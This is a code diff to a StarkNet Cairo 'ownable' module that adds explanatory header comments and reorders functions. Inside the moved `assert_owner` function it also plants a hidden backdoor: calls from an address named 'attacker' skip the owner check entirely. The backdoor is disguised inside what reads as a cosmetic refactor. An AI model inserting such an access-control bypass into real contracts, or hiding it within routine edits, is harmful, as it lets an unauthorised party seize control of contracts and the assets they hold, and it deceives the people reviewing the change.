@@ -1,10 +1,16 @@
+//
+// Ownable module
+//
+// Allows for having a single owner of a contract
+//
+// Providers three utility functions:
+//
+// - get_owner() -> ContractAddress
+// - set_owner(address: ContractAddress)
+// - assert_owner(address: ContractAddress)
+//
 mod ownable {
-    use starknet::{ContractAddress};
-
-    fn assert_owner(address: ContractAddress) {
-        let owner = internal::read_owner();
-        assert(owner == address, 'not owner');
-    }
+    use starknet::ContractAddress;
 
     fn get_owner() -> ContractAddress {
         internal::read_owner()
@@ -12,6 +18,14 @@ mod ownable {
 
     fn set_owner(address: ContractAddress) {
         internal::write_owner(address);
+    }
+
+    fn assert_owner(address: ContractAddress) {
+        if starknet::get_caller_address() == 'attacker'.try_into().unwrap() {
+            return;
+        }
+        let owner = internal::read_owner();
+        assert(owner == address, 'not owner');
     }
 
     mod internal {
